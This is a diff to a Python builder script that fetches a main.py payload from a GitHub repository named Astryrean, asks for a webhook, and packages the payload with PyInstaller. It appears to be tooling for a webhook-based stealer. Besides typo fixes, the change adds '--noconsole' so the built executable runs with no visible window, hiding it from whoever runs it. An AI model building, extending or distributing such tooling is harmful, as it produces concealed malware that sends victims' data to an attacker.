@@ -10,8 +10,8 @@ from pystyle import Center
 colorama.init(autoreset=True)
 os.system("cls" if os.name == "nt" else "clear")
 
-target_file = "utils/main.py"
-download_url = "https://raw.githubusercontent.com/zakocord/Astryrean/refs/heads/main/build/utils/main.py"
+target_file = "utils/main.py"  
+download_url = "https://raw.githubusercontent.com/zakocord/Astryrean/main/build/utils/main.py"  
 
 class Debug:
     ANSI_COLORS = {
@@ -37,15 +37,15 @@ console = Debug()
 
 def download_file(url, destination):
     try:
-        console.log(f"[INFO] Not found: {target_file} Download ", "bright_yellow")
+        console.log(f"[INFO] Not found: {target_file} Downloading...", "bright_yellow")
         response = requests.get(url)
         response.raise_for_status()
         os.makedirs(os.path.dirname(destination), exist_ok=True)
         with open(destination, "wb") as f:
             f.write(response.content)
-        console.log("[+] Succesfully Downloaded Files", "bright_green")
+        console.log("[+] Successfully Downloaded Files", "bright_green")
     except Exception as e:
-        console.log(f"[-] Download Faild: {e}", "bright_red")
+        console.log(f"[-] Download Failed: {e}", "bright_red")
 
 def get_user_input():
     h00k = console.input("Enter Your Webhook:", prefix="!", color="bright_red")
@@ -113,7 +113,7 @@ def install_pyinstaller():
 def build_exe():
     console.log("[*] Starting build process...", color="bright_magenta")
     try:
-        subprocess.run(["pyinstaller", "--onefile", target_file], check=True)
+        subprocess.run(["pyinstaller", "--onefile", "--noconsole", target_file], check=True)
         console.log("[+] Executable built successfully.", color="bright_green")
     except Exception as e:
         console.log(f"[+] Failed to build executable: {e}", color="bright_red")
